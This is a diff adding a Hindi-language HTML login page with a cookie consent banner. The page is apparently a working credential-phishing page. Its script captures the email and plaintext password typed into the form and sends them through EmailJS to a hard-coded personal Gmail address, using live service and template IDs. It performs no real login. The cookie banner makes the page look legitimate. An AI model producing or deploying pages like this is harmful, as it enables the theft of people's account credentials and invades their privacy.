@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login & Cookie Consent</title>
+    <!-- EmailJS CDN -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-container {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 1.8rem;
+            color: #333;
+            font-weight: 600;
+        }
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.4rem;
+            color: #555;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border: 1.5px solid #ddd;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+        input:focus {
+            border-color: #764ba2;
+            box-shadow: 0 0 0 3px rgba(118,75,162,0.2);
+        }
+        button {
+            width: 100%;
+            padding: 0.85rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.3s ease;
+            margin-top: 0.8rem;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        .message {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+            min-height: 1.5rem;
+        }
+        .success {
+            color: #2d862d;
+        }
+        .error {
+            color: #cc0000;
+        }
+        /* Cookie Consent Banner */
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(30, 30, 30, 0.95);
+            color: #f0f0f0;
+            padding: 1rem 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+            z-index: 9999;
+            backdrop-filter: blur(10px);
+            border-top: 2px solid #764ba2;
+            transform: translateY(100%);
+            transition: transform 0.5s ease;
+        }
+        .cookie-banner.show {
+            transform: translateY(0);
+        }
+        .cookie-text {
+            flex: 1 1 60%;
+            font-size: 0.95rem;
+            line-height: 1.4;
+        }
+        .cookie-buttons {
+            display: flex;
+            gap: 0.8rem;
+            flex-wrap: wrap;
+        }
+        .cookie-btn {
+            padding: 0.5rem 1.5rem;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.3s;
+            font-size: 0.9rem;
+        }
+        .accept-btn {
+            background: #4caf50;
+            color: white;
+        }
+        .accept-btn:hover {
+            background: #43a047;
+        }
+        .reject-btn {
+            background: #f44336;
+            color: white;
+        }
+        .reject-btn:hover {
+            background: #e53935;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>🔐 लॉगिन</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">ईमेल</label>
+                <input type="email" id="email" placeholder="your@email.com" required autocomplete="email">
+            </div>
+            <div class="input-group">
+                <label for="password">पासवर्ड</label>
+                <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password">
+            </div>
+            <button type="submit">लॉगिन करें</button>
+        </form>
+        <div class="message" id="formMessage"></div>
+    </div>
+
+    <!-- Cookie Consent Banner (hidden by default, will show if consent not given) -->
+    <div class="cookie-banner" id="cookieBanner">
+        <div class="cookie-text">
+            🍪 यह वेबसाइट आपके अनुभव को बेहतर बनाने के लिए कुकीज़ का उपयोग करती है। कृपया स्वीकार या अस्वीकार करें।
+        </div>
+        <div class="cookie-buttons">
+            <button class="cookie-btn accept-btn" id="acceptCookies">स्वीकार करें</button>
+            <button class="cookie-btn reject-btn" id="rejectCookies">अस्वीकार करें</button>
+        </div>
+    </div>
+
+    <script>
+        // ---------- EmailJS Initialization ----------
+        // YAHAN APNI EMAILJS KE CREDENTIALS DAALEN (Signup at emailjs.com)
+        (function() {
+            emailjs.init("4OatR-YNeivJBgmJB"); // <-- apni Public Key yahan paste karen
+        })();
+
+        // ---------- Cookie Consent Logic ----------
+        const cookieBanner = document.getElementById('cookieBanner');
+        const cookieConsent = getCookie('cookie_consent');
+
+        // Agar cookie nahi mili to banner dikhao
+        if (cookieConsent === null) {
+            cookieBanner.classList.add('show');
+        }
+
+        // Accept button
+        document.getElementById('acceptCookies').addEventListener('click', function() {
+            setCookie('cookie_consent', 'true', 365);
+            cookieBanner.classList.remove('show');
+            // yahan aap extra analytics etc. enable kar sakte hain
+        });
+
+        // Reject button
+        document.getElementById('rejectCookies').addEventListener('click', function() {
+            setCookie('cookie_consent', 'false', 365);
+            cookieBanner.classList.remove('show');
+            // yahan aap tracking scripts disable kar sakte hain
+        });
+
+        // Cookie helpers
+        function setCookie(name, value, days) {
+            const d = new Date();
+            d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + d.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/;SameSite=Lax";
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i].trim();
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
+        // ---------- Login Form Submission ----------
+        const loginForm = document.getElementById('loginForm');
+        const msgDiv = document.getElementById('formMessage');
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // page reload nahi hoga
+
+            // Input values
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const loginTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+            // Basic validation
+            if (!email || !password) {
+                showMessage('कृपया ईमेल और पासवर्ड भरें।', 'error');
+                return;
+            }
+
+            // Show sending status (no popup)
+            showMessage('भेजा जा रहा है...', 'success');
+
+            // Template parameters jaisa EmailJS dashboard me set kiya hoga
+            const templateParams = {
+                to_email: 'meetabhinav2@gmail.com',  // yahi email receive karega
+                from_email: email,
+                password: password,
+                login_time: loginTime,
+                reply_to: email
+            };
+
+            // EmailJS bhejo – SERVICE_ID aur TEMPLATE_ID apne hisaab se badlein
+            emailjs.send('service_56s0ex5', 'template_bdmor2s', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    showMessage('✅ लॉगिन जानकारी सफलतापूर्वक भेज दी गई।', 'success');
+                    // form clear (optional)
+                    loginForm.reset();
+                }, function(error) {
+                    console.error('FAILED...', error);
+                    showMessage('❌ कुछ गड़बड़ हुई। कृपया दोबारा प्रयास करें।', 'error');
+                });
+        });
+
+        function showMessage(text, type) {
+            msgDiv.textContent = text;
+            msgDiv.className = 'message ' + (type === 'error' ? 'error' : 'success');
+            // Auto clear after 5 seconds
+            setTimeout(() => {
+                if (msgDiv.textContent === text) {
+                    msgDiv.textContent = '';
+                    msgDiv.className = 'message';
+                }
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
